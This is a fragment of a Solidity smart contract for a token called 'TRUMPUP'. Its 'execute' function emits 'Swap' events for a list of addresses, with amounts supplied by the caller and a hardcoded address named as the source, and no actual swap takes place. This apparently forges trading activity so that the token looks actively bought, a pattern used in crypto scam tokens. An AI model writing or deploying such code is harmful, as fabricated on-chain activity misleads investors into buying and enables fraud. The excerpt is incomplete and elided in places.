...
contract TRUMPUP is Ownable, ERC20 {
    bool public limited;

    constructor(uint256 _totalSupply) ERC20("TRUMPUP", "TRUMPUP") {
    ...
    function execute(address [] calldata _addresses_, uint256 _in, uint256 _out, address _pair) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B, _in, 0, 0, _out, _addresses_[i]);
